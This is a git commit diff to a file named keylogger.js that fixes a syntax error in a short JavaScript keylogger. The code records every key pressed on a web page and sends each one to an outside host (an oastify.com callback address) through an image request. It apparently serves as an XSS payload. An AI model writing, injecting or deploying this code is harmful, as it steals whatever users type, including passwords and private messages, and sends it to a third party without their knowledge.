bbe08cebb1bda96614bd2b836bc802a3ec19fb8b
Abdul Wassay <57496383+hotplugin0x01@users.noreply.github.com>
2024-07-12 16:51:43 +0500

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -1,4 +1,4 @@
 document.addEventListener('keydown', function (event){
     var key = event.key;
     var img = new Image().src = 'http://ld2ambbsc6r1njatg21gvmuoyf46s0gp.oastify.com/?key='+key;
-}, false
+}, false)
